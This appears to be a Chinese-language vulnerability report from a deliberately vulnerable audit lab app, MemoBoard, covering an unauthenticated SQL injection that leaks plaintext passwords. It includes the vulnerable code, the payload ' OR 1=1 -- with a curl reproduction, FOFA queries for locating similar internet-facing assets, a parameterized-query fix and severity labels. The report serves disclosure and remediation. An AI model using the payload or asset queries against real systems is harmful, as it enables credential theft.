## 摘要

MemoBoard 是一个基于 Flask 的内网备忘录应用。其 `GET /api/users` 接口存在未授权 SQL 注入漏洞。该接口无任何鉴权检查，`name` 查询参数被直接字符串拼接到 SQL 语句中，攻击者可通过注入获取数据库中所有用户的密码（包括管理员 admin 的明文密码）及邮箱等敏感信息。

## 漏洞描述

MemoBoard 是一款使用 Flask 3.0.3 框架开发的内网备忘录看板应用，采用 SQLite 数据库存储用户与备忘录数据。应用提供 `GET /api/users` 接口用于按用户名查询用户信息，该接口无任何身份认证要求。

该接口的 `name` 查询参数被直接拼接到 SQL 语句 `SELECT id, name, role, email, password FROM users WHERE name = '{name}'` 中（`board/engine.py` 第 71 行），未使用参数化查询。攻击者可通过构造如 `' OR 1=1 --` 的注入 payload，使 WHERE 条件恒真，从而返回所有用户记录。由于查询 SELECT 列表包含 `password` 字段，攻击者可直接获取包括 admin 在内的所有用户明文密码。

## 漏洞危害

- **敏感信息泄露**：攻击者可获取所有用户的明文密码（含 admin/admin123）及邮箱等敏感信息。
- **认证绕过/权限提升**：获取 admin 密码后可登录后台，冒用管理员身份操作系统。

## 漏洞厂商全称

MemoBoard（VulnHunter 白盒审计靶场项目）

## 已知受影响产品及版本

MemoBoard v0.5.0（board/__init__.py `__version__ = "0.5.0"`）

## 互联网资产证明
> 用于在公开资产测绘平台定位同类应用资产；优先使用应用自身稳定特征，不把漏洞路径、PoC 参数或一次性业务数据当作唯一指纹。测绘语句不允许出现「或」关系。

### 精准测绘语法

#### FOFA
```text
title="MemoBoard notes" && icon_hash="-151231234" && body="MemoBoard"
```

#### X 情报社区
```text
title="MemoBoard notes" && app="MemoBoard notes" && icon_hash="-151231234"
```

## 漏洞技术细节

### 入口

`GET /api/users?name=<payload>`（`src/app.py` 第 63-70 行）

```python
@app.get("/api/users")
def api_users():
    name = request.args.get("name", "")
    if name:
        rows = run_user_lookup(name)
    else:
        rows = list_users()
    return jsonify({"users": rows})
```

该路由无任何鉴权检查（无 session 校验、无 token 校验、无装饰器），匿名用户可直接访问。

### Sink

`board/engine.py` 第 69-74 行：

```python
def run_user_lookup(name: str) -> list[dict]:
    # String-concatenated SQL. `name` is a query parameter.
    sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"
    with _connect() as conn:
        rows = conn.execute(sql).fetchall()
    return [dict(r) for r in rows]
```

`name` 参数直接拼入 f-string SQL，无转义、无参数化。查询结果通过 `jsonify` 原样返回给攻击者，包含 `password` 字段。

注意：同文件中的 `list_users()`（`store.py:19-22`）使用参数化查询且 SELECT 不含 `password` 字段，但 `run_user_lookup` 既使用字符串拼接又包含 `password` 字段，形成注入点。

### 漏洞代码

- 完整路径：`src/board/engine.py:71`

```python
def run_user_lookup(name: str) -> list[dict]:
    # String-concatenated SQL. `name` is a query parameter.
    sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"
    with _connect() as conn:
        rows = conn.execute(sql).fetchall()
    return [dict(r) for r in rows]
```

### 攻击路径

1. 匿名访问 `GET /api/users?name=' OR 1=1 --`
2. SQL 变为 `SELECT id, name, role, email, password FROM users WHERE name = '' OR 1=1 --'`
3. WHERE 条件恒真，返回所有用户记录（含 password 字段）
4. 从响应中提取所有用户密码（含 admin/admin123）

## 同根因受影响点

- `src/board/engine.py:71` — `run_user_lookup` 函数，字符串拼接 SQL（主报告点）
- `src/app.py:63-70` — `api_users` 路由，无鉴权调用 `run_user_lookup` 并将结果（含 password）返回给客户端

## 复现证明

```bash
# 1. SQL 注入拖取所有用户密码

curl "http://TARGET:5000/api/users?name=' OR 1=1 --"

# 预期响应（JSON）:
# {"users":[{"id":1,"name":"alice","role":"user","email":"alice@memoboard.lab","password":"alice123"},
#           {"id":2,"name":"bob","role":"user","email":"bob@memoboard.lab","password":"bob123"},
#           {"id":3,"name":"admin","role":"admin","email":"admin@memoboard.lab","password":"admin123"}]}

# 2. 使用 PoC 脚本
python poc.py -u http://TARGET:5000
```

## 修复方案

1. 将 `run_user_lookup` 改为参数化查询：
```python
def run_user_lookup(name: str) -> list[dict]:
    sql = "SELECT id, name, role, email FROM users WHERE name = ?"
    with _connect() as conn:
        rows = conn.execute(sql, (name,)).fetchall()
    return [dict(r) for r in rows]
```
2. 从查询中移除 `password` 字段，不应在 API 响应中返回密码。
3. 为 `GET /api/users` 接口添加身份认证。

---

## 审核标注

- 攻击面：前台
- 配置前提：默认配置
- 严重度：高危（high）
- 校准得分：3
- 可达性：未认证可达
- 影响范围：敏感数据泄露/权限提升/部分数据
- 利用复杂度：单请求或简单触发
- 防护状态：无有效防护
- 价值分层：有 CVE 价值（cve_candidate）
- 分层理由：Unauthenticated SQL injection on a public API endpoint that leaks all users' plaintext passwords including admin credentials. Single-request exploitation, no defense, default configuration. Clear CVE-worthy impact: sensitive data leakage enabling authentication bypass and privilege escalation.
- 根因合并键：sqli:run_user_lookup
